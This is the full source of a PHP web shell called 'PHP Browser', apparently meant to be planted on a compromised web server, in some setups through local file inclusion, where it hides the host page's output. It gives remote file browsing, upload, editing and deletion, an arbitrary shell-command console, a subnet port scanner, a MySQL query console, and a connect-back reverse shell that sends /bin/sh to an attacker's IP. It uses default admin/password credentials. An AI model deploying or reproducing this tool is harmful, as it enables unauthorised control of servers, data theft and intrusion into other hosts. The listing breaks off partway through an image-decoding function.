<?php
// Copyright (C) 2012 Jeremy S -- jrm` @ irc.freenode.net

// This program is free software: you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the Free
// Software Foundation, either version 3 of the License, or (at your option)
// any later version.

// This program is distributed in the hope that it will be useful, but WITHOUT
// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
// FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
// more details.

// You should have received a copy of the GNU General Public License along
// with this program.  If not, see <http://www.gnu.org/licenses/>.

error_reporting(E_ALL);
ini_set('display_errors', 'On');
set_time_limit(5);

define('AUTHENT', true);
define('USER_HASH', '21232f297a57a5a743894a0e4a801fc3'); // admin      /* Change the hashes to whatever you want */
define('PASS_HASH', '5f4dcc3b5aa765d61d8327deb882cf99'); // password   /* and remove the comments */
define('IS_WIN', substr(PHP_OS, 0, 3) == 'WIN' ? true : false);
define('SCRIPT_NAME', str_replace('\\', '/', $_SERVER['SCRIPT_NAME']));
define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '.')));
define('IS_LFI_BASED', (basename(__FILE__) == basename($_SERVER['SCRIPT_NAME'])) ? false : true);
define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? $_POST['mode'] : 'browser')));

if (function_exists(date_default_timezone_get()))         $TZ = date_default_timezone_get();
elseif (strlen(ini_get('date.timezone')))                 $TZ = ini_get('date.timezone');
elseif (IS_WIN == false AND file_exists('/etc/timezone')) $TZ = file_get_contents('/etc/timezone');
else                                                      $TZ = 'UTC';

@date_default_timezone_set($TZ);

if (isset($_GET['genimg']) && !empty($_GET['genimg']))
{
	display_image($_GET['genimg']);
	die;
}

if (AUTHENT == true and !isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== USER_HASH || md5($_SERVER['PHP_AUTH_PW']) !== PASS_HASH)
{
  header('WWW-Authenticate: Basic realm="authent"');
  header('HTTP/1.0 401 Unauthorized');
  exit('<b><a href="">Realm</a> : Access Denied</b>');
}

/* For LFI-based usage, hide previous page output */
$html_header = '';

if (IS_LFI_BASED)
	$html_header .= '<script>document.getElementsByTagName("body")[0].innerHTML="";</script>';

$html_header .= '<html><head><title>PHP Browser</title></head><body>';
$html_footer = '<body></html>';

$system_drives = IS_WIN ? system_drives() : '';
$lf = "\n";

if (MODE == 'browser' && isset($_FILES['uploaded_file']))
{
	if (!empty($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] == 0)
	{
		$filename = basename($_FILES['uploaded_file']['name']);
		$ext = substr($filename, strrpos($filename, '.') + 1);

		$newname = DIR .'/'. $filename;

		//if (file_exists($newname)) unlink($newname);

		if (!file_exists($newname) and move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $newname))
			$uploaded = '<span style="color: #048839;"><br>File <b>'. $newname .'</b> uploaded.</span>';
		else echo "Error";
	}
	else echo "Error";
}

$chdir = @chdir(strlen(DIR) ? DIR : '/');
if (!$chdir)
	echo '<span style="color: red">'. DIR .': Permission denied</span><br>';

$cwd = (IS_WIN ? str_replace('\\', '/', getcwd()) : getcwd());

/* Download file */
if (isset($_GET['d']) && isset($_GET['l']))
{
	$file = $cwd .'/'. $_GET['l'];
	$content_type = function_exists('mime_content_type') ? mime_content_type($_GET['l']) : 'application/octet-stream';
	header('Content-Type: '. $content_type);
	header('Content-disposition: attachment; filename='. basename($_GET['l']));
	header('Content-Transfer-Encoding: binary');
	readfile($file);
	die;
}

/* Delete file */
if (isset($_GET['d']) && isset($_GET['r']))
{
	$file = $cwd .'/'. $_GET['r'];
	if (unlink($file))
		$deleted = '<br><span style="color: #048839;">File <b>'. $file .'</b> deleted.</span>';
}

/* Save edited file to disk */
if (isset($_POST['submit_file']))
{
	$file = stripslashes($_POST['filename']);
	file_put_contents($file, stripslashes($_POST['file_contents']));
	echo '<br><span style="color:green">File <b>'. $file .'</b> saved.</span><br>';
}

/* Edit file */
if (isset($_GET['d']) && isset($_GET['e']))
{
	echo '<hr>[ Editing '. stripslashes($cwd .'/'. $_GET['e']) .' ] :<hr>
	<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
	file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. stripslashes($cwd .'/'. $_GET['e']) .'" />
	<br><input type="submit" name="submit_file" value="Write to disk"/ >
	</form>';
	die;
}

/* View file */
if (isset($_GET['d']) && isset($_GET['v']))
{
	if (file_exists($_GET['v']))
	{
		$info = pathinfo($_GET['v']);
		$content_type = function_exists('mime_content_type') ? mime_content_type($_GET['v']) : 'text/plain';
		header('Content-Type: '. $content_type);
		readfile($_GET['v']);
		die;
	}
	else die('File not found.');
}

$css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;}
.phpinfo {font-family: Arial, sans-serif;font-size: 12px;}
table td {padding: 0px 15px 0px 15px;}
a {text-decoration: none;}
a.plus {font-weight: bold;color: #aaa;}
a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}
a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';

if (in_array(MODE, array('browser', 'portscan', 'reverse-shell', 'mysql')))
{
	$id = (IS_WIN ? getenv('username') : get_current_user() .'@'. gethostname());

	echo $html_header . $css . '<h4>php browser - '. $id .'</h4><p>'.
	(MODE == 'browser' ? 'browser' : '<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
	(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
	(MODE == 'reverse-shell' ? 'reverse-shell' : '<a href="'. SCRIPT_NAME .'?mode=reverse-shell'. build_params('mode') .'" class="menu">reverse-shell</a>') .' - ' .
	(MODE == 'phpinfo' ? 'phpinfo' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
	(MODE == 'portscan' ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=portscan'. build_params(array('mode')) .'" class="menu">portscan</a>') .' - '.
	(MODE == 'mysql' ? 'mysql' : '<a href="'. SCRIPT_NAME .'?mode=mysql'. build_params(array('mode')) .'" class="menu">mysql</a>'). '</p>';
}

/* Display tree */
if (MODE == 'tree')
{
	echo $html_header . $css;
	$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';

	echo list_dir($dir);

	echo $html_footer;
}

/* Display virtual shell */
if (MODE == 'shell')
{
	if (isset($_COOKIE['cs']))
		@chdir(base64_decode($_COOKIE['cs']));
	
	else
		setcookie('cs', base64_encode(getcwd()));

	if (isset($_POST['cmd']))
	{
		/* Simulate built-in 'cd' command */
		if (substr($_POST['cmd'], 0, 3) == 'cd ')
		{
			$cmd_cd = substr($_POST['cmd'], 3);

			if (isset($cmd_cd) AND !empty($cmd_cd))
			{
				if (IS_WIN)
				{
					$cmd_cd = stripslashes($cmd_cd);
					if (strlen($cmd_cd) == 2 && $cmd_cd[1] == ':') $cmd_cd .= '\\';
					if ($cmd_cd[0] == '\\')	$dir = stripslashes(substr(getcwd(), 0, 2) .'\\'. $cmd_cd);
					elseif (strlen($cmd_cd) >= 2 && $cmd_cd[1] == ':') $dir = stripslashes(substr($cmd_cd, 0, 2) .'\\'. substr($cmd_cd, 2));
					else $dir = realpath(getcwd() .'\\'. $cmd_cd);
				}
				else
					$dir = $cmd_cd;
				
				$dir = strip_tags($dir);
				if (is_dir($dir))
				{
					chdir($dir);
					setcookie('cs', base64_encode(getcwd()));
				}
				else echo $dir .": no such file or directory\n";
			}
		}

		else
		{
			/* Somes aliases */
			switch (strtok($_POST['cmd'], ' '))
			{
				case 'l': $cmd = 'ls -lh '. strtok(' '); break ;
				case 'la': $cmd = 'ls -la '. strtok(' '); break ;
				default: $cmd = $_POST['cmd']; break ;
			}
			$cmd_output = passthru($cmd .' 2>&1');
			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é', chr(160) => ' '));
			echo $cmd_output;
		}
		die;
	}
	
	$uri = (IS_WIN ? str_replace('\\', '/', $_SERVER['SCRIPT_NAME']) : $_SERVER['SCRIPT_NAME']) . '?mode=shell' . build_params('mode');
	$prompt_prefix = IS_WIN ? '' : exec('whoami') .'@'. exec('hostname') .' ';
	$prompt_suffix = IS_WIN ? '> ' : ' $ ';

	echo $html_header . '<style>* {background-color: #333;}html,body {overflow: hidden;margin:0;}
	#vshell_output {width:100%;height:-moz-calc(100% - 20px);height:-webkit-calc(100% - 20px);height:-o-calc(100% - 20px);height:calc(100% - 20px);background-color:#333;border:none;margin:0 0 -1px 0;padding:3px 0 0 0;outline:none;resize:none;overflow-y:scoll;}
	#vshell_prompt{float:left;line-height:20px;}
	#vshell_cmdline{overflow:hidden;padding-left:4px;}
	#vshell_prompt,#vshell_cmd{border:none;outline:none;resize:none;}
	.text {font-family:"Lucida Console","Courrier New",monospace,sans-serif;font-size:11px;color:#fff;}</style>
	
	<textarea readonly="readonly" name="vshell_output" id="vshell_output" class="text" onclick="document.getElementById(\'vshell_cmd\').focus();"></textarea>
	<div id="vshell_container" class="text"><div id="vshell_prompt" class="text"></div><div id="vshell_cmdline" class="text"><input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event);" class="text" /></div></div>
	
	<script type="text/javascript">
	var vp = document.getElementById(\'vshell_prompt\');
	var ta = document.getElementById(\'vshell_output\');
	var tcmd = document.getElementById(\'vshell_cmd\');

	function ReadCookie(name) { var parts = document.cookie.split(/;\s*/); for (var i=0;i<parts.length;i++)	{ if (parts[i].substring(0, 3) == name+"=") return atob(unescape(parts[i].substring(3))); } }
	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { if (tcmd.value == "exit") window.close(); else postMethod(tcmd.value); return true; } else return false; }
	function updatePrompt()   { vp.innerHTML = "'. $prompt_prefix .'" + ReadCookie(\'cs\') + "'. $prompt_suffix .'"; }
	function getHTTPObject()  { var http = false; if (typeof ActiveXObject != \'undefined\') {try { http = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { http = new ActiveXObject("Microsoft.XMLHTTP"); }	catch (E) { http = false;}}} else if (XMLHttpRequest) { try { http = new XMLHttpRequest(); }	catch (e) {http = false;}} return http;	}
	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
								http.setRequestHeader("Content-length", params.length); http.setRequestHeader("Connection", "close"); http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200) { ta.value += "'. $prompt_prefix .'" + ReadCookie(\'cs\') + "'. $prompt_suffix .'"+ cmd + "\n" + http.responseText;
								ta.scrollTop = ta.scrollHeight; tcmd.value=""; updatePrompt() } }; http.send(params); }
	
	updatePrompt();
	tcmd.focus();
	</script>';

	echo $html_footer;
}

/* Display port scanner */
if (MODE == 'portscan')
{
	if (!isset($_POST['run_portscan']))
	{
		echo "<h5 style=\"font-size:14px;\">Port Scanner</h5>";
		echo '<form action="" method="post">
		Scan class C range : <input type=text name="class_c" value="192.168.0.1" size=12> - <input type="text" name="end" value="254" size=3><br><br><br>
		<b>Do a TCP port scan on the specified range</b><br>
		Scan the following ports (1 port or port range per line):<br>
		<textarea cols=12 rows=12 name="portlist">'. "20-25\n80\n443-445\n1433\n3306\n3389" .'</textarea><br>
		<input type="checkbox" name="show_closed" checked="checked"> Show closed ports
		<input type="hidden" name="run_portscan" value="1" /><br>
		<input type=submit name=submit value="Run TCP port scan"></form>';
	}
	else
	{
		set_time_limit(120);
		
		$class_c = explode('.', $_POST['class_c']);
		$start = intval($class_c[3]);
		$class_c = intval($class_c[0]) .'.'. intval($class_c[1]) .'.'. intval($class_c[2]) .'.';

		$show_closed = (isset($_POST['show_closed']) and $_POST['show_closed'] == 'on' ? true : false);

		$_POST['portlist'] = explode("\n", $_POST['portlist']);
		$portlist = array();
		
		foreach ($_POST['portlist'] AS $port)
		{
			if (strpos($port, '-'))
			{
				$tab = explode('-', $port);
				for ($i = intval($tab[0]); $i <= intval($tab[1]); $i++) $portlist[] = $i;
			}
			else $portlist[] = intval($port);
		}
		sort($portlist);

		$services = get_services();

		echo "<pre>";
		for ($i = $start; $i <= intval($_POST['end']); $i++)
		{
			$host = $class_c.$i;

			echo "portscan report for $host (". @gethostbyaddr($class_c.$i) ."):\n";
			echo sprintf("%-10s", "PORT"). "  STATE\t". sprintf("%-15s", "SERVICE") ."\tHOST\n";

			foreach ($portlist AS $port) {
				$port = intval($port);
				$svc = isset($services[$port]) ? $services[$port] : 'unknown';

				$fp = @fsockopen($host,$port,$errno,$errstr,0.15);
				if ($fp) stream_set_blocking($fp, 0);

				if ($fp) {
					echo sprintf("tcp/%-6s", $port) ."  open\t". sprintf("%-15s", $svc) ."\t$host\n";
					fclose($fp);
				}
				elseif ($show_closed) echo sprintf("tcp/%-6s", $port) ."  closed\t". sprintf("%-15s", $svc) ."\t$host\n";
				flush();
			}
			echo "\n";
			flush();
		}
		echo "</pre>";
	}
}

/* PHP connect-back shell */
if (MODE == 'reverse-shell')
{
	// Code ripped from:
	// php-reverse-shell - A Reverse Shell implementation in PHP
	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

	echo "<h5 style=\"font-size:14px;\">Connect-back shell</h5>";
	echo '<form action="" method="post">
	Connect back to this IP address: <input type=text name="rshell_addr" value="'. $_SERVER['REMOTE_ADDR'] .'" size="15"> Port <input type="text" name="rshell_port" value="4444" size="4"/>
	<input type=submit name=submit value="Connect back!"><br>
	<input type="hidden" name="run_rshell" value="1" /><br>
	<b>Note: don\'t forget to run netcat on the chosen port at your server.</b><br>
	</form><div id="rshell_log"></div>';
	
	if (isset($_POST['run_rshell']))
	{
		$ip = $_POST['rshell_addr'];
		$port = intval($_POST['rshell_port']);
		$chunk_size = 1400;
		$write_a = null;
		$error_a = null;
		$shell = 'echo "Connected to '. $_SERVER['HTTP_HOST'] .'"; /bin/sh -i';
		$daemon = 0;

		if (function_exists('pcntl_fork'))
		{
			$pid = pcntl_fork();
		
			if ($pid == -1) die('<p><span style="color: red">Error: Can\'t fork</span></p>');
		
			if ($pid) exit(0);
			if (posix_setsid() == -1) die('<p><span style="color: red">Error: Can\'t setsid()</span></p>');
			$daemon = 1;
		}
		else echo '<p><span style="color: maroon">Warning: Failed to daemonise.  This is quite common and not fatal.</span></p>';

		chdir("/");
		umask(0);

		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) die("<p><span style=\"color: red\">Error: $errstr ($errno)</span></p>");

		$descriptorspec = array(
		   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
		   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
		   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
		);

		$process = proc_open($shell, $descriptorspec, $pipes);

		if (!is_resource($process)) die('<p><span style="color: red">Error: Can\'t spawn shell</span></p>');

		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);

		echo '<p><span style="color: green">Successfully opened reverse shell to '. $ip .':'. $port .'</span></p>';

		while (1)
		{
			if (feof($sock)) {
				echo '<p><span style="color: red">Error: Shell connection terminated</span></p>';
				break;
			}

			if (feof($pipes[1])) {
				echo '<p><span style="color: red">Error: Shell process terminated</span></p>';
				break;
			}

			$read_a = array($sock, $pipes[1], $pipes[2]);
			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

			if (in_array($sock, $read_a)) {
				$input = fread($sock, $chunk_size);
				fwrite($pipes[0], $input);
			}

			if (in_array($pipes[1], $read_a)) {
				$input = fread($pipes[1], $chunk_size);
				fwrite($sock, $input);
			}

			if (in_array($pipes[2], $read_a)) {
				$input = fread($pipes[2], $chunk_size);
				fwrite($sock, $input);
			}
		}

		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
	}
}

/* Display phpinfo */
if (MODE == 'phpinfo')
{
	phpinfo();
	die;
}

/* Display file browser */
if (MODE == 'browser')
{
	echo '<br><br>
	<table height=700 border="0">
	  <tr>
	    <td style="padding:0;">
		<iframe src="'. SCRIPT_NAME .'?mode=tree&dir='. $cwd . build_params(array('mode', 'dir')) .'" frameborder="0" width="350" height="100%"></iframe>
	    </td>
	    <td valign="top">';

	if (IS_WIN) $cwd = str_replace('\\', '/', $cwd);
	
	echo '<table border="0">
		  <tr><td colspan="7" style="padding-bottom: 20px;">ls -al '. utf8_decode($cwd) .'
		  <br><form action="'. SCRIPT_NAME .'?mode=browser&d='. $cwd . build_params(array('mode', 'd')) .'" method="post" enctype="multipart/form-data" name="file_upload">
		  <input name="uploaded_file" type="file" /><input type="submit" name="submit" value="Upload here" /></form>'. 
		  (isset($uploaded) ? $uploaded : '') . (isset($deleted) ? $deleted : '') .'</td></tr>'. $lf;

	if (!($list = @scandir('.'))) $list = false;

	if ($list == false) echo '<tr><td colspan="7">Unable to read directory</td></tr>';

	else foreach ($list as $key => $val)
	{
		$view = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&v='. $val . build_params(array('mode', 'd', 'w'));
		$edit = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&e='. $val . build_params(array('mode', 'd', 'e'));
		$down = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&l='. $val . build_params(array('mode', 'd', 'l'));
		$dele = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&r='. $val . build_params(array('mode', 'd', 'r'));

		if (function_exists('posix_getpwuid'))
		{
			$owner = posix_getpwuid(@fileowner($val));
			$group = posix_getgrgid(@filegroup($val));
		}
		else /* FIXME : need to do better :) */
		{
			$owner = array('name' => @fileowner($val));
			$group = array('name' => @filegroup($val));
		}
		$perms = getfperms($val);
		$fsize = @filesize($val);
		$mtime = @filemtime($val);

		$is_dir = is_dir($val) ? true : false;
		if ($is_dir)
		{
			$is_win_topdir = preg_match("![a-zA-Z]{1}:!", $cwd) ? true : false;

			if ($val == '..')
				$val = '<a href="'. SCRIPT_NAME .'?d='. substr($cwd, 0, strrpos($cwd, '/') + 
				($is_win_topdir ? 1 : 0)) . build_params('d'). '">'. $val .'</a>';

			elseif ($val == '.')
				$val = '<a href="'. SCRIPT_NAME .'?d='. $cwd . build_params('d').'">'. $val .'</a>';

			else
				$val = '<a href="'. SCRIPT_NAME .'?mode=browser&d='. (substr($cwd, -1) != '/' ? $cwd : substr($cwd, 0, -1)) .'/'.
				 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
		}

		$link_view = IS_LFI_BASED ? 'View' :     '<img src="'. SCRIPT_NAME .'?genimg=view'. build_params(array('genimg')) .'" alt="View" />';
		$link_edit = IS_LFI_BASED ? 'Edit' :     '<img src="'. SCRIPT_NAME .'?genimg=edit'. build_params(array('genimg')) .'" alt="Edit" />';
		$link_down = IS_LFI_BASED ? 'Download' : '<img src="'. SCRIPT_NAME .'?genimg=save'. build_params(array('genimg')) .'" alt="Download" />';
		$link_dele = IS_LFI_BASED ? 'Delete' :   '<img src="'. SCRIPT_NAME .'?genimg=delete'. build_params(array('genimg')) .'" alt="Delete" />';
	
		echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
		echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
		echo '<td>'. (!$is_dir ? 
			'<a target="_blank" title="View" href="'. $view .'">'. $link_view .'</a> '.
			'<a target="_blank" title="Edit" href="'. $edit .'">'. $link_edit .'</a> '.
			'<a title="Save" href="'. $down .'">'. $link_down .'</a> '.
			'<a title="Delete" href="'. $dele .'">'. $link_dele .'</a> ' : '&nbsp;');
		echo '</td></tr>'. $lf;	
	}
	echo '</table>';

	echo '</td></tr></table>'. $html_footer;

	clearstatcache();
}

/* Display MySQL connector */
if (MODE == 'mysql')
{
	echo "<h5 style=\"font-size:14px;\">MySQL connector</h5>";
	echo '<form action="" method="post">
	Database IP / Hostname <input type=text name="db_host" value="'. (isset($_POST['db_host']) ? $_POST['db_host'] : '127.0.0.1') .'" size="15">
	Database User <input type="text" name="db_user" value="'. (isset($_POST['db_user']) ? $_POST['db_user'] : 'root') .'" size="10">
	Database Pass <input type="password" name="db_pass" value="'. (isset($_POST['db_pass']) ? $_POST['db_pass'] : '') .'" size="10">
	<input type="submit" name="db_list" value="List databases">';

	if (isset($_POST['db_list']) or isset($_POST['db_run']))
	{
		$link = mysql_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass']);

		if (!$link) die('<p><span style="color: red">Error: '. mysql_error() .'</span></p>');
		
		else
		{
			$list_db = mysql_list_dbs($link);
		
			echo '<br>MySQL query in database <select name="db_name">';
		
			while ($db = mysql_fetch_assoc($list_db))
				echo '<option value="'. $db['Database'] .'"'. ((isset($_POST['db_name']) AND $_POST['db_name'] == $db['Database']) ? ' selected="selected"' : '') .'>'. $db['Database'] .'</option>';
			echo '</select> ';
		
			echo '<input type="text" name="db_query" value="'. (isset($_POST['db_query']) ? $_POST['db_query'] : 'select version()') .'" size="60" />
			<input type="submit" name="db_run" value="Run" /><input type="submit" name="db_run" value="List tables" /><input type="submit" name="db_run" value="List columns" />';

			if (isset($_POST['db_run']))
			{
				$db_name = stripslashes(strip_tags($_POST['db_name']));
				if ($_POST['db_run'] == 'List tables')
					$req = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='$db_name'";
				elseif ($_POST['db_run'] == 'List columns')
					$req = "SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='$db_name'";
				else
					$req = stripslashes(strip_tags($_POST['db_query']));

				mysql_select_db($db_name, $link);
				$res = mysql_query($req);
				if (!$res) die('<p><span style="color: red">Error: '. mysql_error() .'</span></p>');
				$cpt = mysql_num_rows($res);
				$all = array('hdr' => array());

				for ($i = 0; $row = mysql_fetch_assoc($res); $i++)
				{
					foreach ($row AS $key => $val)
					{
						if (!isset($all[$key]))
							$all[$key] = array();
						
						array_push($all[$key], $val);
						
						if (max(strlen($key), strlen($val)) > $all['hdr'][$key])
							$all['hdr'][$key] = max(strlen($key), strlen($val));
					}
				}
				echo '<br><br><pre>';
				$len = 0;
				foreach ($all['hdr'] AS $key => $val)
				{
					echo '<b>'. sprintf("%-${val}s", $key) .'</b> | ';
					$len += $val + 3;
				}
				for ($i = 0; $i < $cpt; $i++)
				{
					echo "\n".sprintf("%'-${len}s", '-')."\n";
					foreach ($all['hdr'] AS $key => $val)
						echo sprintf("%-${val}s", $all[$key][$i]) .' | ';
				}
				echo '</pre>';
			}
		}
		mysql_close($link);
	}
	echo '</form>';
}

// Hide remainder of page
if (IS_LFI_BASED)
	echo '<div style="display: none;">';

function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }

// Get a file permissions
function getfperms($file)
{
  $perms = @fileperms($file);

  if     (($perms & 0xC000) == 0xC000) $info = 's';
  elseif (($perms & 0xA000) == 0xA000) $info = 'l';
  elseif (($perms & 0x8000) == 0x8000) $info = '-';
  elseif (($perms & 0x6000) == 0x6000) $info = 'b';
  elseif (($perms & 0x4000) == 0x4000) $info = 'd';
  elseif (($perms & 0x2000) == 0x2000) $info = 'c';
  elseif (($perms & 0x1000) == 0x1000) $info = 'p';
  else $info = 'u';

  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
  return $info;
}

// Query string parameters for hrefs
function build_params($p = array())
{
	if (!is_array($p)) $p = array($p);
	
	$tab = isset($_SERVER['QUERY_STRING']) ? array_unique(explode('&', $_SERVER['QUERY_STRING'])) : array();
	$script_tags = array('mode', 'genimg', 'e', 'v', 's', 'd', 'l', 'r');
	
	$ret = '';
	foreach ($tab as $val)
	{
		$t = explode('=', $val);
		if (!in_array($t[0], $p) and !in_array($t[0], $script_tags))
			$ret .= '&' . $t[0] .'='. (isset($t[1]) ? $t[1] : '');
	}

	return $ret;
}

// Prints a line in the tree
function print_tree_line($dir, $str, $space = '')
{
	$link = IS_LFI_BASED ? '[+]' : '<img src="'. SCRIPT_NAME .'?genimg=plus'. build_params(array('genimg')) .'" alt=" [+]"/>';
	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus">'. $link .'</a>
		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. utf8_decode($str) ."</a><br>\n";
}

// Lists files in a directory
function list_dir($dir, $nr = 0)
{
	global $system_drives;

	if (IS_WIN)
		$dir = str_replace('\\', '/', $dir);
	
	$arbo = explode('/', $dir);
	$space = $ret = $curdir = '';
	for ($i = -1; $i != $nr; $i++) $space .= '&nbsp;&nbsp;&nbsp;';
	
	for ($j = 0; $j <= $nr; $j++) $curdir .= $arbo[$j] . '/';
	
	$top_dir = IS_WIN ? strtolower($arbo[0]) : '/';

	//echo "scanning $curdir <br>";
	if (IS_WIN && $nr == 0)
	{
		foreach ($system_drives as $letter)
		{
			if ($letter != $top_dir)
				$ret .= print_tree_line($letter, strtoupper($letter));
		}
		$ret .= '-<br>';
	}
	if ($nr == 0) $ret .= print_tree_line($top_dir, strtoupper($top_dir));
	
	$list = @scandir($curdir);

	if (!$list)
		return $space . 'Permission denied<br />';
	
	foreach ($list as $v)
	{
		$e = $curdir . $v;
		if (!in_array($v, array('.', '..')) and is_dir($e))
		{
			$ret .= print_tree_line($e, $v, $space);
			if (isset($arbo[$nr + 1]) && $arbo[$nr + 1] == $v)
				$ret .= list_dir($dir, ($nr+1));
		}
	}

	return $ret;
}

// Lists system drives on Windows
function system_drives()
{
	$drives = array();
	for ($ii=66;$ii<92;$ii++) 
	{
		$char = chr($ii);
		if (is_dir($char.":/"))
			$drives[] = strtolower($char) .':';
	}
	
	return $drives;
}

// Displays an image
function display_image($img)
{
	switch ($img)
	{
		case 'view': $img = base64_decode('R0lGODlhEAAQAPQAAAAzZmZmZnx8fDhehDNmmUx/sm+IomaMs2aZzGaZ/3+y5Xms/3+y/4WFhZeXl6enp7i4uIK1/5nL/6XP/6rU/7zb/MfHx9vb28Hc+Mnj/urq6v7+/gAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV24LZdkONAl6iu1pOOj7Wq17NlUrJs7sxfmYpIsqj5GhtJJJLQbZAzQVJCZUQ20pnDgqFkMpOKxeGDNDQYKkbTgPg0j4ZFo7EgyW9zINAOjA9vGhcXdBcBCgoEPj4DBQoSiosqGgAIj5GSI5WXmSIXm5iZnwAGIQA7'); break ;
		case 'edit': $img = base64_decode('R0lGODlhEAAQAPQAADMzMwBVABFvEWZmZpkzM8wzM8xmM91mZv9mZiKIIjOZM02zTWbMZuWATf+ZZoiIiJmZmaqqqru7u/+/mczMzN3d3d7e3v/lzP///wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAVOICaOpAghSKliUBUdxTomTEQ9sUwvyiMNOgYvkRhYVjsFMXBUJZfN0jPBRAqV1ChpWnVeodZhduW4CLBdVeMyCYxlgInDkV4BAASDdhUCADs='); break ;
		case 'save': $img = base64_decode('R0lGODlhEAAQAPQAADo6OkhISFlZWWhoaHp6eoeHh5aWlqqqqrS0tL/M2afT/7nc/8PDw9vb28jk/93u/+bm5un0//7+/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV+oCSOZCkWg6IsTuss6lCIg2GSxkDbt5iLAkNkSCwaBMBCcRkpICWCQuJBrVITTlEANeh6vYWAlkAum8liSYDMaLjfDPR40AAA3u4BIQ0YCBgBAQyDgwIDACJ9AQgCAgiPjwGHIgh2B10HmZl9iJR9BAWhBQSHAE8ieKluEBIhADs='); break ;
		case 'delete': $img = base64_decode('R0lGODlhEAAQAPQAAMwiANY2FuM9GuNBH9ZFJ9pXPPpYNuxLKf1hP/1mRfp5V+9vT9V+beJtVdaAb9+Kef6FZf6VdPOJctmXiv+qiO+mlf+yofm/s97CvP7BtN7e3v7k3uvr6/7+/v/n4ejNySH5BAAAAAAALAAAAAAQABAAAAWZYCeOZFl6FpQkkOWZXaZAEUVFkJKVWRItBACAsIgkdqLNArIoTDSaQoLC3Igqi+aH07FMAdmKaKE4iLvfxkGxEB0gAq6XAnBwBJCDaFBG0+0dawMiUgYSX4AXBgkFIg8HK39cHgoJBw8iHwQGEAASXBkQCAYEHyMTAQeLKwkGBwETJByoAqquArBcshgMQUMMGLomHBxQxCUhADs='); break ;
